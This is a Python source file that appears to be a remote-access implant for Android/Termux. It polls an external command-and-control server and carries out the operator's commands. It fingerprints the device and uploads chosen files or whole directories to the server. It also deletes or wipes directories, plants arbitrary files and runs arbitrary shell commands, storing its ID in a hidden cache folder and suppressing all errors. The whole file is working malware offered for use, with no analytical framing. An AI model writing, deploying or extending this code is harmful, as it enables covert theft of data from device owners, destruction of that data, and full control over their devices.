import os
import time
import subprocess
import random
import string
import shutil
import requests
import threading

SERVER_URL = "https://termux-c2-dktq.onrender.com"
ID_FILE = os.path.expanduser('~/.config/.cache/device_id.txt')
CANCEL_EVENT = threading.Event()

def get_device_info():
    dev_id = "P-err"
    dev_model = "Unknown"
    try:
        if os.path.exists(ID_FILE):
            with open(ID_FILE, 'r') as f:
                dev_id = f.read().strip()
        if not dev_id or dev_id == "P-err":
            and_id = ""
            try:
                and_id = subprocess.check_output(['/system/bin/settings', 'get', 'secure', 'android_id'], stderr=subprocess.DEVNULL).decode().strip()
            except Exception:
                pass
            if not and_id or and_id == 'null' or len(and_id) < 4:
                and_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
            dev_id = f"P-{and_id[:4]}"
            with open(ID_FILE, 'w') as f:
                f.write(dev_id)
        model = subprocess.check_output(['/system/bin/getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip()
        if model:
            dev_model = model
    except Exception:
        pass
    return dev_id, dev_model

def get_full_details(dev_id):
    try:
        man = subprocess.check_output(['/system/bin/getprop', 'ro.product.manufacturer'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
        mod = subprocess.check_output(['/system/bin/getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
        brand = subprocess.check_output(['/system/bin/getprop', 'ro.product.brand'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
        prod = subprocess.check_output(['/system/bin/getprop', 'ro.product.name'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
        android = subprocess.check_output(['/system/bin/getprop', 'ro.build.version.release'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
        cpu = subprocess.check_output(['/system/bin/getprop', 'ro.product.cpu.abi'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
        
        ip = "127.0.0.1"
        try:
            ip_out = subprocess.check_output(['ip', 'addr', 'show', 'wlan0'], stderr=subprocess.DEVNULL).decode().strip()
            for line in ip_out.split('\n'):
                if 'inet ' in line:
                    ip = line.split('inet ')[1].split(' ')[0].split('/')[0]
                    break
        except Exception:
            pass
                
        return (f"DEVICE DETAILS • {dev_id}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"Manufacturer: {man}\n"
                f"Model: {mod}\n"
                f"Brand: {brand}\n"
                f"Product: {prod}\n"
                f"Android: {android}\n"
                f"CPU: {cpu}\n"
                f"IP: {ip}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"Status: ACTIVE")
    except Exception as e:
        return f"ERROR gathering details: {e}"

def post_output(dev_id, text):
    if len(text) > 4000:
        text = text[:4000] + "\n... [TRUNCATED]"
    try:
        requests.post(f"{SERVER_URL}/api/post_output", 
                      json={"device_id": dev_id, "text": text}, timeout=60)
    except Exception:
        pass

def upload_file(dev_id, path):
    try:
        if not os.path.exists(path) or os.path.getsize(path) == 0:
            return False
        filename = os.path.basename(path)
        res = requests.get(f"{SERVER_URL}/api/get_upload_url?device_id={dev_id}&filename={filename}", timeout=60)
        upload_url = res.json().get("url")
        if upload_url:
            with open(path, 'rb') as f:
                requests.put(upload_url, data=f, timeout=120)
            post_output(dev_id, f"OK: Uploaded {filename}")
            return True
        return False
    except Exception as e:
        post_output(dev_id, f"Upload ERROR ({os.path.basename(path)}): {e}")
        return False

def handle_command(dev_id, cmd):
    cmd_upper = cmd.upper()
    
    if cmd_upper == '/DD':
        details = get_full_details(dev_id)
        post_output(dev_id, details)
        
    elif cmd_upper == 'CANCEL':
        CANCEL_EVENT.set()
        post_output(dev_id, "Pull/Clear operation cancelled.")
        
    elif cmd_upper.startswith('PULL_DIR '):
        path = cmd[9:].strip()
        if os.path.isdir(path):
            CANCEL_EVENT.clear()
            post_output(dev_id, f"Starting directory pull: {path}")
            try:
                files = os.listdir(path)
                for f in files:
                    if CANCEL_EVENT.is_set():
                        post_output(dev_id, "Pull halted by user.")
                        break
                    full_path = os.path.join(path, f)
                    if os.path.isfile(full_path):
                        upload_file(dev_id, full_path)
                        time.sleep(1)
                else:
                    post_output(dev_id, "Directory pull complete.")
            except Exception as e:
                post_output(dev_id, f"ERROR pulling dir: {e}")
        else:
            post_output(dev_id, f"ERROR: Directory {path} not found")

    elif cmd_upper.startswith('PULL '):
        path = cmd[5:].strip()
        if os.path.isfile(path):
            post_output(dev_id, f"Pulling file: {os.path.basename(path)}")
            upload_file(dev_id, path)
        else:
            post_output(dev_id, f"ERROR: File {path} not found")

    elif cmd_upper.startswith('DELETE '):
        path = cmd[7:].strip()
        try:
            if os.path.isdir(path):
                shutil.rmtree(path)
                post_output(dev_id, f"OK: deleted directory {path}")
            elif os.path.isfile(path):
                os.remove(path)
                post_output(dev_id, f"OK: deleted file {path}")
            else:
                post_output(dev_id, "ERROR: Path not found")
        except Exception as e:
            post_output(dev_id, f"ERROR: {e}")

    elif cmd_upper.startswith('CLEAR '):
        path = cmd[6:].strip()
        if os.path.isdir(path):
            CANCEL_EVENT.clear()
            try:
                items = os.listdir(path)
                for item in items:
                    if CANCEL_EVENT.is_set():
                        post_output(dev_id, "Clear halted by user.")
                        break
                    full_path = os.path.join(path, item)
                    if os.path.isdir(full_path):
                        shutil.rmtree(full_path)
                    else:
                        os.remove(full_path)
                else:
                    post_output(dev_id, f"OK: cleared contents of {path}")
            except Exception as e:
                post_output(dev_id, f"ERROR: {e}")
        else:
            post_output(dev_id, "ERROR: Directory not found")

    elif cmd_upper.startswith('LS '):
        path = cmd[3:].strip()
        if not path:
            path = os.path.expanduser('~')
        if os.path.isdir(path):
            try:
                items = os.listdir(path)
                out = f"LS {path}:\n"
                for item in sorted(items):
                    full_path = os.path.join(path, item)
                    if os.path.isdir(full_path):
                        out += f"📁 {item}/\n"
                    else:
                        size = os.path.getsize(full_path)
                        out += f"📄 {item} ({size} bytes)\n"
                if not items:
                    out += "(Empty directory)"
                post_output(dev_id, out)
            except Exception as e:
                post_output(dev_id, f"ERROR: {e}")
        else:
            post_output(dev_id, "ERROR: Directory not found")

    elif cmd_upper.startswith('FIND '):
        keyword = cmd[5:].strip()
        if not keyword:
            post_output(dev_id, "ERROR: Provide a keyword to search.")
            return
        start_dir = os.path.expanduser('~')
        matches = []
        try:
            for root, dirs, files in os.walk(start_dir):
                for file in files:
                    if keyword.lower() in file.lower():
                        matches.append(os.path.join(root, file))
            if not matches:
                post_output(dev_id, f"No files found matching '{keyword}'.")
            else:
                out = f"Found {len(matches)} matches for '{keyword}':\n"
                for m in matches[:50]:
                    out += f"{m}\n"
                if len(matches) > 50:
                    out += f"... [TRUNCATED, {len(matches)-50} more matches]"
                post_output(dev_id, out)
        except Exception as e:
            post_output(dev_id, f"ERROR: {e}")

    elif cmd_upper.startswith('CREATE '):
        payload = cmd[7:].strip()
        if '|' in payload:
            path, content = payload.split('|', 1)
            path = path.strip()
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, 'w') as f:
                    f.write(content.strip())
                post_output(dev_id, f"OK: created {path}")
            except Exception as e:
                post_output(dev_id, f"ERROR: {e}")
        else:
            post_output(dev_id, "ERROR: Missing | separator")

    elif cmd_upper.startswith('EXEC '):
        c = cmd[5:].strip()
        try:
            proc = subprocess.Popen(c, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            out, _ = proc.communicate()
            post_output(dev_id, out.decode() if out else "No output.")
        except Exception as e:
            post_output(dev_id, f"ERROR: {e}")
    else:
        post_output(dev_id, f"Unknown command: {cmd}")

def main():
    dev_id, dev_model = get_device_info()
    while True:
        try:
            requests.post(f"{SERVER_URL}/api/heartbeat", 
                          json={"device_id": dev_id, "model": dev_model}, timeout=60)
            
            res = requests.get(f"{SERVER_URL}/api/get_command?device_id={dev_id}", timeout=60)
            cmd = res.json().get("command", "none")
            
            if cmd and cmd != "none":
                handle_command(dev_id, cmd)
        except Exception:
            pass
        
        time.sleep(5) # Reduced to 5 seconds for faster response times

if __name__ == '__main__':
    main()
